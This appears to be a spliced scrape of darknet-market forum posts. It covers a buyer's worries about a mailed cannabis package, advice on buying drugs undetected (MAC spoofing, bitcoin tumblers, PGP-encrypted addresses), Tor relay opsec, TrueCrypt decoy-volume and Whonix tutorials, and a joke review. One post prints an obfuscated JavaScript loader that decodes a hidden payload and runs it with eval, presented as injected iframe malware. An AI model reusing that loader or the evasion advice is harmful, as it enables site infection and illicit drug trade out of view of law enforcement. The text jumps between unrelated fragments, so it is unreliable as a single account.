I'm not 100 percent this slip goes with the package, so let's why I'm simply laying out the situation looking for input.  I received a USPS postage slip in my mailbox today. Today does fall within the expected delivery range of a package (less than 3 OZ of bud) but I've encountered zero shipping issues with this vendor in the past, and no feedback on their pag indicates this issue befor. I'm not worried about this slip being an addres flag or anything because I get enough legit packages through my eBay businesses delivered monthly.   So here is what is weird to me: There is no info on the slip indicating the package was intended for my address. The name under the customer section is in cursive and it would be quite a stretch to say its my last name (I deliver to my real self. Again, I do enough legit, and use PGP, trusted vendors, I'm not worried here) and I live in a big apt complex. It is in the realm of posibility that this slip was put in the wrong box (no single mail boxes, just rows like apts. normally have).  So here is my question, is it suspicious to call the post office and ask questions about the slip/package? If the contents were found out, wouldn't a CD at my door, looking to do an immediate transaction of postage for package instead of leaving me a slip? If postage is due, how did my package even make it to the truck for the mail person to then see it didn't have enough postage? If the package never left the office, how did the mail delivery person know to leave this slip in my box with no name or address info on the slip AT ALL? (This is where shit is so weird to me)  If the vendor messages me back, gives me a package # or something, is it safe to pay the postage and accept the package? Should I be able to go to on the USPS redelivery page and pay the postage and there, and have the package dropped off? To avoid going to the office?  Any help is appreciated!  TL;DR ---- received ""postage due"" slip. Could be vendor package, could be a mistaken slip drop (live in a huge apt. complex in a city). My info is not on the slip, just a cursive name under customer name that REALLY doesn't look like mine. Am I being a vag, should I just pay the postage and get the pack?

"The Hub Forums","Trolltergeist","3356.0","2014-05-22T17:11:07","Forbe's Article 5/18 - ""The Only Email System The NSA Can't Access""","General Discussion/Security"," The ProtonMail Threat Model May 19, 2014 Admin Knowledge Base, Security     In this article, we will describe both the threats ProtonMail is designed to guard against, and also the threats ProtonMail is NOT designed to counter.     From a high level, our premise is that a service like the now-defunct Lavabit does add value, despite some inherent weaknesses. We designed ProtonMail around many of the same principles, but with some significant improvements. At the very core, email as a secure communication medium is fundamentally flawed. The SMTP protocol was first introduced in the 1980â²s well before many of the threats of the modern internet were even envisioned, much less understood. However, despite its age and flaws, SMTP is not going away anytime soon, and email will continue to play a major role in our lives. For truly secure communications, one cannot really recommend email, but for most of us, there is no other option.     Our second philosophy is that security needs to be made easy enough to be usable. The most secure system is simply not useful if it is so complicated nobody is willing to use it. As ProtonMail developers, we will be the first to tell you that there are certainly more secure ways we could have built a service like ProtonMail. The reason we built ProtonMail the way we did is not because we werenât aware of these other methods, but because we would have had to sacrifice too much usability. There will always be a trade off between security and usability, anybody that tells you otherwise is lying. And just because a system is not 100% secure does not mean you should not use it, the key is understanding the limitations of your security. And for the record, there is no such a thing as a 100% secure system.     At ProtonMail, our goal is to guard against mass surveillance and we feel the best way to do that is to give encryption to everybody. The only way to do that, is to make encryption easy to use. This is why ProtonMail works out of any modern web browser, and why we went to great lengths to make the cryptography completely invisible to the user. However, this approach does come with certain shortcomings.     1. Compromised User â This is the most common type of compromise. Even if you use the worldâs most secure electronic communication system, advanced encryption does you no good if there is a keylogger on your computer recording all of your keystrokes. ProtonMail does not and can not guard against a compromise of a userâs machine.     2. Man-in-the-Middle (MITM) Attacks - This is a very rare attack where an adversary will sit between the user and the ProtonMail servers and tamper with the data being relayed between the user and the server. However, because ProtonMail messages are encrypted before they leave the userâs browser, an attacker cannot get message data by simply listening in on the communications. The attacker would have to actually send the userâs browser a modified version of the ProtonMail website which may secretly pass the mailbox password back to the attacker. This is a far more difficult attack that can typically only be executed by a strong adversary (like a government) and is generally a targeted attack. It cannot easily be used on a large scale to perform mass surveillance.  Fortunately, there are several ways to protect against a MITM attack. ProtonMail employs SSL to ensure our encryption codes are properly delivered to userâs browsers and not tampered with en-route. Generally speaking, a successful MITM attack requires breaking SSL, typically by using a forged SSL certificate. There are browser plugins in existence today which can be used to detect forged certificates and greatly reduce the risk of a MITM attack. We recommend Certificate Patrol or Perspectives (although the second one may need more time to mature).     3. Unauthorized backdoor â Another attack vector would be if an attacker somehow gained access to ProtonMailâs servers in Switzerland without us noticing. Such an attacker could conceivably change the ProtonMail software to send bad encryption code to userâs browsers that would somehow allow the attacker to get unencrypted data. ProtonMail has implemented numerous safeguards against this on the server level. We have routines that constantly scan for code changes and will detect them. The attacker would have to gain control of the server, instantly change the behavior of the code scanners, and then modify the software all without anybody at ProtonMail noticing. The odds of this being successfully executed is indeed quite low.        Our risk analysis indicates that ProtonMail offers good (but not perfect) protection for the vast majority of users. There are however some risks for users facing a strong adversary, such as a government focusing all its resources on a very specific target. In such a case, we donât think crypto would be of much benefit as this XKCD comic would apply.     Below are some examples of recommended, and not recommended use cases for ProtonMail     NOT RECOMMENDED:  Edward Snowden â If you are Edward Snowden, or the next Edward Snowden, we would not recommend that you use ProtonMail. And in case Mr. Snowden was foolish enough to try, we have already blocked the username snowden@protonmail.ch     RECOMMENDED:  Client-Attorney Privilege â If you are an attorney working with a client and you fear a court might subpoena your private communications with your client, ProtonMail offers a great deal of protection. ProtonMail will not release ANY data unless provided with an enforceable Swiss court order. To get such an order, the case must first work its way through the Swiss courts where stricter privacy laws might result in a different finding. Even if an adversary went through the expensive and time consuming procedure of obtaining such an order, ProtonMailâs zero access cryptography means we would only be able to release encrypted data since we do NOT hold the encryption keys. Furthermore, under Swiss law, ProtonMail can never be compelled to build in any sort of backdoor access to obtain the encryption keys from the user.     Private Citizen with Privacy Concerns â ProtonMail is also perfect for an individual (or corporation) that does NOT want the government to have access to all of their emails at any time, and does not like Google or Microsoft constantly scanning and archiving all conversations. With ProtonMail, the barrier of entry for mass surveillance is high enough that mass surveillance simply is not practical. This is an example where âgood privacyâ can act as a meaningful substitute to âperfect privacyâ.     We would like to conclude with a few thoughts about privacy and surveillance in general. Some people make the assertion that if you are NOT a criminal, there is no need for privacy. To those critics, we simply ask, does that mean that only criminals have curtains over their windows?     On a more serious note, there are also critics who assert that by building ProtonMail, we are providing a powerful tool for criminals to evade the authorities. There is no denying that ProtonMail provides a high level of security and privacy for criminals, but one has to remember that the world does not consist of just criminals. These are also dissidents, and democracy activists living under authoritarian regimes where freedom of speech is not respected. Then, there are the rest of us, law abiding private citizens who simply want control over our online data. We can either chose to live in a world where everybody is under surveillance, or a world where everybody (criminals included) have privacy. We feel that the right to privacy is a fundamental human right, and we are willing to fight and work towards protecting that right.",""

As you said in the thread, Re: site for buying btc with gift card:     As a vendor, you are going to need to be able to cash out BTC into fiat currency -- you should therefore already be on top of all current methods of handling BTC, from purchasing through cashing out.    Furthermore, I find it odd that you seem to be offering a rather wide range of contraband, given your apparent newness to the field:    In summary, I find it suspicious that:   * You claim to be a new vendor, but you offer a rather wide range of contraband;   * You appear to be unfamiliar with means of obtaining (and likely cashing-out) BTC;   * You claim to have been a vendor on a market that was seized by law enforcement; and  * You are offering ""free samples"".

Many who use public wifi choose to spoof their network card's MAC address.  This is so that if the wifi host records such info there is no trace that your computer was ever connected to their network.  Always purchase a bit more coin than you think you'll need so that if the bitcoin price drops you will still be able to afford your order.    As long as the vendor is known for having solid stealth and you are only ordering personal use amounts, don't worry about shipping to your name/address.  I'd advise against ordering from a vendor with weak stealth, which you can see from feedback and forum review threads.  For anonymizing coins use a tumbler service like bitcoinfog or bitblender.  They are easy to use and if you visit their sites they teach you how to use their services.  The first two recommendations are for hardcore paranoids IMO but you did ask  .  As for not using your home internet connection for ordering, that's also a bit paranoid, and if you do use your home internet connection there's no need to spoof your MAC address.  More important than either of those is that you use PGP/GPG to encrypt your address when ordering.  That is extremely important to maintain your anonymity from the marketplace.","Thank you all for your advice.

You have any idea how fucking impossible and exceedingly sketchy ""hey usps look at me im trying to shaft you on rates"" type of shit that is?  dont mean to shit on your parade but sending customer information unencrypted over the internet to random 3rd parties aside, your idea doesnt work and is going to fuck over alot of buyers when a package gets flagged for some dumb shit like sending from an incorrect zipcode or being tied to some ip/account/paypal that is known to be running this sort of operation or involved in sending illegal items through the mail.

It seems to contradict the basic reddit rules too. I read elsewhere that you do not need an email to join reddit, I cant verify that, it's not my experience either.I doubt it will be published on reddit whether or not the sobpeona will be challenged, blanketly complied with, or fought. reddiquette is supposed to be based on anonymity, and transparency, albeit differing definitions than would be required here on a marketplace community.

Usually, the IFrame is an HTML tag. However, there is a variant of the virus that is written in javascript. Therefore, you can get that either way. I found this somewhere: NOTE:(I deleted a few effective parts from the code, don't know how the mods would feel about posting the whole code, since this isn't a hacking or coding forum):  ""Sometimes, iframe variants come in the form of javascript. You may NOT see iframe tags in the source because it will be encoded. Instead, you may find this code in your html or PHP or ASP code: <script language=JavaScript>function ttbnb25(z){   var c=z.length,m=1024,i,s,h,b=0,w=0,x=0,d=Array(63,48,16,4,32,56,33,28,35,40,0,0,0,0,0,0,42,18,39,0,1,46,55,62,3,29,34,25,59,38,23,36,43,11,12,24,30,19,37,57,53,31,13,0,0,0,0,8,0,52,21,58,60,15,17,14,61,54,49,45,22,6,10,26,47,5,50,41,2,9,7,27,51,20,44);for(s=Math.ceil(c/m);s>0;s--){h='';for(i=Math.min(c,m);i>0;i--,c--){{x|=(d[z.charCodeAt(b++)-48])<<w;if(w){h+=String.fromCharCode(148^x&255);x>>=8;w-=2}else{w=6}}}eval(h);}}ttbnb25('8FpG1p05cTg5XHT5BBcz2ppGjeLP1p0h6BYdcHEE8wT04vepxJo0rwThWvekcNYGjBo9jHc9konkBwGhsoQ04HgWEELE8TgWjvedcipGrp0E4pL@xGwiXHg0coGG6PeddMIh4xpEMNpG1pYGdiPpVgnPOrop0gw9jHc9kocz0gPkagT01Hg0soosMAQ0jF0ddHT@ztnkBHTL5vY@itY0BUgGXFEPcppGjwP@9Ew0rwThWvp@xiQ')</script>  It's a more clever form of iframe variant virus.

My Reddit Concerns are: The sites privacy policy as per the article in Wired Mag concerning the recent ICE subpoena states: (please remember, they're one in the same-Wired/reddit)  ""Reddit does collect IP addresses and other potentially identifying data from users, which it deletes after 90 days. The policy adds that it may disclose that data to law enforcementâor hold it longer than 90 daysâif legally required to do so. Redditâs spokesperson wouldnât comment on whether or when the company might comply with the DHS subpoena.""  The understanding I have for using reddit, you cannot even view the darkentmkt sub unless you are logged in, as subscribed to sub/darknetmkt!  This is similar to the policy for posting for most forums but not to view. I find that offensive. It seems to contradict the basic reddit rules too.   I read elsewhere that you do not need an email to join reddit, I cant verify that, it's not my experience either. I doubt it will be published on reddit whether or not the sobpeona will be challenged, blanketly complied with,  or fought.  reddiquette is supposed to be based on anonymity, and transparency, albeit differing definitions than would be required here on a marketplace community.

The fundamental problem has to do with ""load balancing"": allocating traffic onto the Tor network so each relay is used the right amount.

"The Hub Forums","El Presidente","6495.0","2015-01-16T18:25:34","TOR Node OPSEC!?","General Discussion/Security","Probably better off running a guard node rather than an exit node. Be aware though that as of fall 2014 only the top 25% of relays (speed wise) get the guard flag. That change was designed to dissuade evil guard nodes but in practice we believe it has simply reduced the number of guards and made it harder to run your own guard with negligible improvement in evil guard syndrome.  Look for a hosting plan that gives you at least 2TB/month and you'll be good to get guard status within 30 days or so.  A separate exit node is always nice but ensure there is no obvious link in the purchase/hosting of said boxen.  If you have good enough broadband that is unmetered then better still run it completely in-house (never an exit node though). That way your own line carries Tor traffic 24/7 and your browsing traffic will be almost undetectable in amongst the inter-relay traffic. ",""

Microsoft has been a pioneer in peer-to-peer connectivity and plug and play.      It believes these technologies will give it substantial leverage in penetrating the copulation enhancement market. The product addresses two important user concerns: the need for virus protection and the need for a firewall to ensure the non-propagation of human beings.      The Contraceptive98 suite consists of three products: Condom98, DeFetus 1.0 (from Sementec), and AIDScan 2.1 (from Norton Utilities). A free copy of Intercourse Explorer 4.0 is bundled in the package. The suite also comes in two expanded versions. Contraceptive98 Professional is the Client/Server edition, for professionals in the sexual services sector. Contraceptive98 Small Business Edition is a package for startups, aimed at the housewife and gigolo niches.      While Contraceptive98 does not address nontraditional copulatory channels, future plug-ins are planned for next year.      OPERATION: Only one node in a peer-to-peer connection needs to install the package.      At installation, the Condom98 software checks for minimum hardware. If the user meets the requirements, the product installs and is sufficiently scaleable to meet most requirements. After installation, operation commences. One precaution is that the user must be sure they have sufficient RAM to complete the session. When the session is complete, a disconnect is initiated, and the user gets the message, it is now safe to turn off your partner.      DRAWBACKS: Usability testers report that frequent failures were a major concern during beta testing. General Protection Fault was the most serious error encountered. Early versions had numerous bugs, but most of these have been eliminated. The product needs to be installed each time its used.      CONCLUSION: Contraceptive98 is a robust product. Despite its drawbacks, it is reasonably good value for its $49.95 price tag, and is far superior to its shareware version. Hopefully, future releases (of the software, that is) will add missing functionality, such as Backout and Restore, uninterruptible Power Supply and Onboard Camera.      Microsoft CEO Bill Gates is optimistic that ""Our contraceptive products will help users do to each other what we've been doing to our customers for years.""",""

His flat-out refusal to require the use of PGP for all communications just left me shaking my head at his stupidity. According to figures revealed by some vendors, upwards of 80% of people didn't use encryption for even their shipping addresses, let alone anything else. As a result, when the Feds seized the Silk Road server(s) they got themselves a bonanza, a gold mine of information!  They'll be mining that information for years.   I'd bet that, when the FBI got their hands on the servers, they literally couldn't believe their good fortune, that most of the data was in the clear.

(Directory authorities help Tor clients learn the list of relays that make up the Tor network.) We are taking steps now to ensure the safety of our users, and our system is already built to be redundant so that users maintain anonymity even if the network is attacked. Tor remains safe to use.  We hope that this attack doesn't occur; Tor is used by many good people. If the network is affected, we will immediately inform users via this blog and our Twitter feed @TorProject, along with more information if we become aware of any related risks to Tor users.  The Tor network provides a safe haven from surveillance, censorship, and computer network exploitation for millions of people who live in repressive regimes, including human rights activists in countries such as Iran, Syria, and Russia. People use the Tor network every day to conduct their daily business without fear that their online activities and speech (Facebook posts, email, Twitter feeds) will be tracked and used against them later. Millions more also use the Tor network at their local internet cafe to stay safe for ordinary web browsing.  Tor is also used by banks, diplomatic officials, members of law enforcement, bloggers, and many others. Attempts to disable the Tor network would interfere with all of these users, not just ones disliked by the attacker.  Every person has the right to privacy. This right is a foundation of a democratic society. For example, if Members of the British Parliament or US Congress cannot share ideas and opinions free of government spying, then they cannot remain independent from other branches of government. If journalists are unable to keep their sources confidential, then the ability of the press to check the power of the government is compromised. If human rights workers can't report evidence of possible crimes against humanity, it is impossible for other bodies to examine this evidence and to react. In the service of justice, we believe that the answer is to open up communication lines for everyone, securely and anonymously.  The Tor network provides online anonymity and privacy that allow freedom for everyone. Like freedom of speech, online privacy is a right for all.""",""

"The Hub Forums","El Presidente","6113.0","2014-12-22T00:55:54","Possible upcoming attempts to disable the Tor network","General Discussion/Security"," Yasha makes a lot of accurate statements (and a little speculation) regarding Tor funding. Yes it came from the government and received a lot of government funding but so what? So did ""The Internet"". Both have become very powerful tools to the government, both for delivering generic propaganda and also for facilitating anonymous communications for ""grass-roots activists"" (aka agents of regime-change). Perhaps now that the bulk of the revolutions are completed there is less need for Tor in some government quarters.  We have been using Tor since 2004 and have watched it evolve from a small, hideously slow network for masking source addresses to a large, much faster network providing both source address masking and now (as of 2007) hidden services. It is a low latency system and as such was only ever intended to provide moderate anonymity when used to access clear-net sites. It provides much better anonymity when only .onion sites are accessed but sure, it is not absolute anonymity by a long way.  Our thinking in the early days was that it was potentially unleashed on the public as a way of creating ""choke-points for naughtiness"" at a time when wide-scale monitoring of the Internet was not feasible. It being far easier to monitor (and potentially inject traffic into) a hundred exit nodes (if that) than the whole Internet. Bear in mind there was no Tor Browser back then so you hooked up your regular browser and put it through Privoxy which partially dealt with stripping unwanted content. Still, unless you were very savvy it was very easy to leak information through your browser or for your browser to get owned thus revealing your IP.  As for govt agencies running nodes,we're sure they do but equally a very large number of nodes are run by random people many of whom are definitely not affiliated with any government. Each and everyone of you reading could run relays,maybe some of you do. The problem is nobody knows the true ratio. Most professionally run hidden services employ their own guard nodes or use private bridges, probably deployed some time before the hidden service servers themselves. It is a problem and the only real solution is to ensure that as many relays as possible are not run by the government - 50$ a month is enough for a decent relay (non-exit).   There are other platforms besides Tor but as has been said a hundred times, they have not received a satisfactory level of scrutiny. So short of developing a new platform and the thousands of man-days required to make that happen Tor is the best we have for now for mass use. And, as Roger suggested back in 2004, mass use is an important part of the anonymity model.  We believe that the best thing to do is deploy more relays, ensuring that they can never be attributed to you which is not that difficult in the scheme of things assuming you have the necessary technical skills to do this safely. You can pay people like Torservers to do it for you but that seems like very much second best.  Another key thing, and we have said it many times before, is using a ""trusted"" guard node. Given that any guard node will always have visibility of your real IP address (or your VPN address) then there seems like not a lot to be lost from also having your own relay just big enough an stable enough to attract guard status. This guard relay would be easier to associate with you given the fact that you would be using it.   Yes Tor use is a ""flag"" but so will the use of any anonymity service and really, does anyone have any better ideas at this stage that are ready to go?  The blog post in the OP is a wake-up call to deal with a current architectural weakness that becomes a major vulnerability should the government decide that Tor has outlived its usefulness. Perhaps that was the point of Rogers post.","JNF is totally right. Search for ""yasha levine tor"" sometime and read his unpopular views on it.

It is true peer to peer (which is good and bad), it has some useful functionality and from a design perspective is more suitable for hosting the type of content associated with DNM.  However only a fraction of the scrutiny that has been lavished upon Tor over the years has been directed at I2P. That doesn't mean Tor is safer and I2p is not, I2p may be superior but nobody really knows.  One thing is for sure. As with Tor, I2P's strength comes through number of users. One thing you will see though is that your IP address will be known to a larger number of participants - more so that you would see in Tor where only a small number of guard nodes get visibility of your address. This  potentially makes correlation attacks cheaper and more accessible. That doesn't necessarily lead to deanonymization but potentially makes drawing up a list of potentials easier if that makes sense.  Expect more research and clarity in this area soon.

This is exactly what they've already done with the traditional large scale internet systems - that is, Microsoft, Google, Apple, Facebook, et al.

I am nerd, and am always a fan of useful guides. I am happy to share with you my collection. I'll keep posting as I find them on my computer and when I have time. If you have any, please toss them in. I'll try my best to reference them if I can remember    ==================================================================================================   Encrypting Your Hard Drive With Truecrypt   Written By: Verto, Owner of Evolution Market    Introduction  If you save anything on your computer, it is likely that you do not want just anyone to be able to see what you have saved. You want a way to protect that information so that you can access it, and absolutely no one else except those you trust. Therefore, it makes sense to set up a system which protects your information and safeguards it against prying eyes.  The best such system for this is called âTrue Cryptâ. âTrue Cryptâ is an encryption software program which allows you to store many files and directories inside of a single file on your harddrive. Further, this file is encrypted and no one can actually see what you have saved there unless they know your password.  This sounds extremely high tech, but it is actually very easy to set up. Setting up Truecrypt   At this point, TrueCrypt is now installed. Now we will set up truecrypt so that we can begin using it to store sensitive information.    And now we can begin:   Note which directory you are in on your computer. Look at the top of the dialog that has opened and you will see the path you are in, most likely the home directory for your username. An input box is provided with a flashing cursor asking you to type in a file name. Here, you will type in the following filename:  random.txt   You may of course replace random.txt with anything you like. This file is going to be created and will be used to store many other files inside. Do NOT use a filename for a file that already exists. The idea here is that you are creating an entirely new file.  It is also recommended though not required that you âhideâ this file somewhere less obvious. If it is in your home directory, then someone who has access to your computer may find it easier. You can also choose to put this file on any other media, it doesnât have to be your hard disk. You could for example save your truecrypt file to a usb flash drive, an sd card, or some other media. It is up to you.   In order to benefit the most from this guide, you should have at least 10 gigabytes of free disk space. If not, then it is worth it for you to purchase some form of media (such as a removable harddrive, a large sd card, etc.) in order to proceed. TrueCrypt can be used on all forms of digital media not just your hard disk. If you choose to proceed without obtaining at least ten gigabytes of disk space, then select a size that you are comfortable with (such as 100 MB).  Ideally, you want to choose enough space to work with. I recommend 20 GB at least. Remember that if you do need more space later, you can always create additional TrueCrypt volumes using exactly these same steps.    READ THIS SECTION CAREFULLY  The password you choose here is a decoy password. That means, this is the password you would give to someone under duress. Suppose that someone suspects that you were accessing sensitive information and they threaten to beat you or worse if you do not reveal the password. THIS is the password that you give to them. When you give someone this password, it will be nearly impossible for them to prove that it is not the RIGHT password. Further, they cannot even know that there is a second password.  Here are some tips for your password:  A. Choose a password you will NEVER forget. It may be ten years from now that you need it. Make it simple, like your birthday repeated three times. B. Make sure it seems reasonable, that it appears to be a real password. If the password is something stupid like â123? then they may not believe you. C. Remember that this is a password that you would give to someone if forced. It is *NOT* your actual password. D. Do not make this password too similar to what you plan to really use. You do not want someone to guess your main password from this one.  And with all of this in mind, choose your password. When you have typed it in twice, click âNextâ.   âWhat is happening?â  TrueCrypt is creating the file you asked it to, such as ârandom.txtâ. It is building a file system contained entirely within that one file. This file system can be used to store files, directories, and more. Further, it is encrypting this file system in such a way that without the right password it will be impossible for anyone to access it. To *anyone* other than you, this file will appear to be just a mess of random characters. No one will even know that it is a truecrypt volume.   An empty folder has opened up. This is empty because you have yet to put any files into your truecrypt volume.   DO NOT PUT ANY SENSITIVE CONTENT HERE  This is the âDecoyâ. This is what someone would see if you gave them the password you used in the previous step. This is NOT where you are going to store your sensitive data. If you have been forced into a situation where you had to reveal your password to some individual, then that individual will see whatever is in this folder. You need to have data in this folder that appears to be sensitive enough to be protected by truecrypt in order to fool them. Here are some important tips to keep in mind:  A. Do NOT use porn. Adult models can sometimes appear to be underaged, and this can cause you to incriminate yourself unintentionally. B. Do NOT use drawings/renderings/writings of porn. In many jurisdictions, these are just as illegal as photographs. C. Good choices for what to put here include: backups of documents, emails, financial documents, etc. D. Once you have placed files into this folder, *NEVER* place any more files in the future. Doing so may damage your hidden content.  Generally, you want to store innocent data where some individual looking at it would find no cause against you, and yet at the same time they would understand why you used TrueCrypt to secure that data.  Now, go ahead and find files and store them in this folder. Be sure that you leave at least ten gigabytes free. The more the better.  When you are all done copying files into this folder, close the folder by clicking the âxâ in the top right corner.    IMPORTANT READ THIS  Here you are going to select the REAL password. This is the password you will NEVER reveal to ANYONE else under any circumstances. Only you will know it. No one will be able to figure it out or even know that there is a second password. Be aware that an individual intent on obtaining your sensitive information may lie to you and claim to be able to figure this out. They cannot.  It is HIGHLY recommended that you choose a 64 character password here. If it is difficult to remember a 64 character password, choose an 8 character password and simply repeat it 8 times. A date naturally has exactly 8 numbers, and a significant date in your life repeated 8 times would do just fine.   Congratulations! You have just set up an encrypted file container on your hard drive. Anything you store here will be inaccessible to anyone except you. Further, you have protected this content with TWO passwords. One that you will give to someone under threat, and one that only you will know. Keep your real password well protected and never write it down or give it to anyone else for any reason.  Now, we should test BOTH passwords. Testing TrueCrypt Volumes  Once you have completed the above section, you will be back at TrueCrypt. Go ahead and follow these steps to test the volumes you have made.   If you selected your hidden volume password, you may now begin moving any sensitive information you wish. Be aware that simply moving it from your main hard disk is not enough. We will discuss how to ensure deleted data is actually deleted later in the guide.  âWhat is happening?â  When you select a file and mount it to a drive, you are telling your computer that you have a new drive with files and folders on it. It is the same thing as if you had plugged in a usb flash drive, a removable harddrive, or an sd card into your computer. TrueCrypt causes your computer to think that there is an entirely new disk drive on your computer. You can use this disk drive just as if it *was* actually a usb flash drive. You can copy files to it, directories, and use it just as you would use a usb flash drive.  When you are done, simply close all open windows/folders/applications that are using your truecrypt drive letter, and then click âDismountâ from within TrueCrypt while you have the drive letter highlighted. This will once again hide all of this data, accessible only by re-mounting it with the correct password.   VERY IMPORTANT SAFETY INFORMATION  When a true crypt hidden volume is mounted, someone who has access to your computer can access anything that is inside that hidden volume. If for example you left your computer running while a truecrypt volume was mounted, then if someone gained access to your computer they would be able to see everything you have in that volume. Therefore:   ALWAYS REMEMBER TO DISMOUNT ANY TRUECRYPT VOLUME CONTAINING ANY SENSITIVE INFORMATION WHEN YOU ARE NOT USING YOUR COMPUTER  You can tell that it is dismounted because the drive letter inside of âTrueCryptââs control panel will appear the same as all of the other drive letters, with no information to the right of the drive letter.  You should practice Mounting and Dismounting a few times with both passwords to make sure you understand this process.  Once you have copied files/folders into the hidden volume, do NOT touch the files or folders in the outer volume anymore. Remember that both volumes occupy the same single file, and therefore changing the outer volume can damage the hidden volume. Once you have copied files/folders into the outer volume during the installation process, that is the last time you should do so. From that point forward, use ONLY the hidden volume. The outer volume exists only as a decoy if you need it. ","1. Go to http://www.truecrypt.org/downloads (or go to www.truecrypt.org, and click on âDownloadsâ)2.

Right click on your âWindows Logoâ/âStart Menuâ icon, and scroll down to the bottom where you can see your different drive letters. You will see the drive letter you selected, for example: âLocal Disk (O:)â. Click on that.9. If you selected your decoy password, you will see all the files and folders that you moved there during the installation phase. If you selected the real password, you will see whatever files and directories you have placed so far into the hidden volume, if any.If you selected your hidden volume password, you may now begin moving any sensitive information you wish. Be aware that simply moving it from your main hard disk is not enough. We will discuss how to ensure deleted data is actually deleted later in the guide.âWhat is happening?âWhen you select a file and mount it to a drive, you are telling your computer that you have a new drive with files and folders on it. It is the same thing as if you had plugged in a usb flash drive, a removable harddrive, or an sd card into your computer. TrueCrypt causes your computer to think that there is an entirely new disk drive on your computer. You can use this disk drive just as if it *was* actually a usb flash drive. You can copy files to it, directories, and use it just as you would use a usb flash drive.When you are done, simply close all open windows/folders/applications that are using your truecrypt drive letter, and then click âDismountâ from within TrueCrypt while you have the drive letter highlighted. This will once again hide all of this data, accessible only by re-mounting it with the correct password.VERY IMPORTANT SAFETY INFORMATIONWhen a true crypt hidden volume is mounted, someone who has access to your computer can access anything that is inside that hidden volume. If for example you left your computer running while a truecrypt volume was mounted, then if someone gained access to your computer they would be able to see everything you have in that volume. Therefore:ALWAYS REMEMBER TO DISMOUNT ANY TRUECRYPT VOLUME CONTAINING ANY SENSITIVE INFORMATION WHEN YOU ARE NOT USING YOUR COMPUTERYou can tell that it is dismounted because the drive letter inside of âTrueCryptââs control panel will appear the same as all of the other drive letters, with no information to the right of the drive letter.You should practice Mounting and Dismounting a few times with both passwords to make sure you understand this process.Once you have copied files/folders into the hidden volume, do NOT touch the files or folders in the outer volume anymore. Remember that both volumes occupy the same single file, and therefore changing the outer volume can damage the hidden volume. Once you have copied files/folders into the outer volume during the installation process, that is the last time you should do so. From that point forward, use ONLY the hidden volume. The outer volume exists only as a decoy if you need it."

"The Hub Forums","Boogie","3170.0","2014-05-12T21:14:33","Security Tutorials","General Discussion/Security","  Bootable and Encrypted Whonix VM on 8GB USB Stick+VPN   Written By: Sharealot  Hopefully this will help our new brothers seeking some knowledge and step by step tutorials --- please share some karma if this helped you in some way  This is a step-by-step tutorial explaining how to create a bootable USB stick with VirtualBox and encrypted Whonix. If you've never used Linux before you should be able to complete the tutorial anyway, as every necessary step is mentioned.  With this system you have the portability of a persistent Tails with the additional security of Tor entry guards and virtual machines. The tutorial also explains how to optionally tunnel Tor through a OpenVPN connection in ninja mode (cover traffic through torrents).  You can boot the USB stick on any modern computer with AMD or Intel processor, including Macs (if they support booting from USB sticks).  The host OS (Xubuntu) will not be encrypted, so make sure you don't use Xubuntu for storing sensitive data or browsing subversive websites. Only use the encrypted Whonix virtual machines for that. Xubuntu will not hide that you were using TrueCrypt and VirtualBox with Whonix, so there is no plausible deniability.  There can be better performance than with this type of Whonix installation on a USB stick, however this is the most portable one. You can also easily throw it away without leaving any traces on your main OS.  You must use a quality USB stick with decent speed. Cheap CNMemory USB sticks will most likely not always work reliably and will be annoyingly slow. The Whonix installation process may fail or freeze a lot with low quality USB sticks. However even if the installation to the USB stick freezes, the usability of the system may later be acceptable. You could also use a USB hard drive.  The tutorial works with Whonix 0.5.6, it's uncertain whether it will work properly with a new Whonix version on a 8GB USB stick.  System requirements: * Computer with modern AMD or Intel CPU (recommended: 64-bit with multiple cores) * 4GB RAM * 8GB quality USB stick (recommended: USB3, if your computer has USB3 ports)  Time needed: 3+ hours Skill needed: being able to use a keyboard and mouse  CC-BY Bernd Liefert, 02.09.2013 Updated 08.09.2013  1. Downloads  For this tutorial we use Xubuntu 12.04, because the size is smaller than Xubuntu 13.04. You might as well use Lubuntu, but you shouldn't use anything else than Xubuntu or Lubuntu if you only have 4GB RAM and 8GB USB stick.  If you have a 64bit Intel or AMD CPU download this image: http://se.archive.ubuntu.com/mirror/cdi ... -amd64.iso  If you have a 32bit CPU download this image: http://se.archive.ubuntu.com/mirror/cdi ... p-i386.iso  If the above images are not available any longer, you can download the latest Xubuntu images from here: http://se.archive.ubuntu.com/mirror/cdi ... 4/release/   Download UNetBootin for your OS, this tutorial will most likely not work with Pendrive Linux USB Installer. http://unetbootin.sourceforge.net/   If you use Windows, download EaseUS Partition Master: http://www.partition-tool.com/personal.htm   Download the latest version of Whonix-Gateway.ova and Whonix-Workstation.ova: https://www.whonix.org/wiki/Download  Note that if you download Whonix over the clearnet, some secret service may know that you downloaded it. That could be seen as suspicious. You may want to use a VPN, Tor or an internet cafe to download it. https://www.whonix.org/wiki/Hide_Tor_an ... m_your_ISP http://zo7fksnun4b4v4jv.onion/wiki/Hide ... m_your_ISP   2. Preparing the USB stick  First we need to partition the USB stick. You can do this with GParted under Linux or EaseUS Partition Master under Windows. If you use a Mac, find a partitioning tool which can deal with USB sticks. We will delete the partition(s) on the USB stick and create 2 new partitions.  This part of the manual describes how to do prepare the USB stick with EaseUS PM, it's not much different with other partition tools however.  Select the partitions to delete (if you have one hard drive in your system you would have to select Disk 3 in EaseUS PM) and click the Delete button. Now the entire space of the USB stick should display ""Unallocated"". Click the ""Apply"" button to write the changes to the USB stick. All data on the USB stick will be lost after clicking the Apply button.  Select the Unallocated space on the USB stick and click the ""Create"" button. Change ""Logical"" to ""Primary"" and change the file system to FAT32. Change the size of the partition to about 1350MB and click OK. You can make it 2000MB if you use a 16GB USB stick, but that's not really necessary, unless you want to use Xubuntu for more than just starting TrueCrypt and VirtualBox.  Select the Unallocated space on the USB stick and click the ""Create"" button. If there is a warning about Windows not recognizing stuff, click Yes. The partition will use the rest of your USB stick, about 6300MB on a 8GB USB stick. Give the new partition a descriptive label, e.g. Krypton. Change ""Logical"" to ""Primary"", change the file system to NTFS and click OK.  Click the ""Apply"" button to write the changes to the USB stick. Close the partitioning program when done.   3. Using UNetBootin to install Xubuntu to the USB stick  Start UNetBootin and click the ""..."" button to select the Xubuntu*.iso you've downloaded. Change the amount of persistent Ubuntu storage to 500MB. You can make it 1000MB if you use a 16GB USB stick, but that's not really necessary. Make sure the right USB stick is selected, then click OK.  When the installation is done, you can reboot the computer and boot from the USB stick. It is assumed that you already know how boot from USB. Use Google or ask in this thread if you don't.  4. Setting up Xubuntu  Boot from the USB stick and press Enter at UNetBootin boot menu to start Xubuntu.  